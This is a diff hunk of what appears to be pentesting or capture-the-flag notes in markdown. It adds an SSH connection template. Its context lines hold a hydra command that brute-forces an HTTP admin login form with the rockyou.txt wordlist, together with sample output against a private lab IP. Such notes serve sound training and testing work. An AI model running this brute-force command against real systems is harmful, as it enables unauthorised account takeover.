@@ -16,3 +16,7 @@ hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/:user=^USER^&pass=^PAS
 Ex output
 attacking http-post-form://10.49.135.232:80/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid
 ```
+#### SSH
+```bash
+ssh -p <Port Number> user@<TargetIP>
+```
